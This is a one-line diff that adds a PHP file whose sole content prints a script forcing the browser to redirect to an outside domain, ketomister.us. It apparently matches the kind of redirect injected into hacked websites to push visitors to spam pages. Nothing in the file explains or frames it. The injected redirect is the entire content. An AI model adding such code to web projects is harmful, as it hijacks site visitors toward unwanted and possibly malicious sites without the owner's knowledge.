@@ -1,0 +1,1 @@
+<?php echo '<script> location.href=\'http://ketomister.us\'; </script>'; ?>
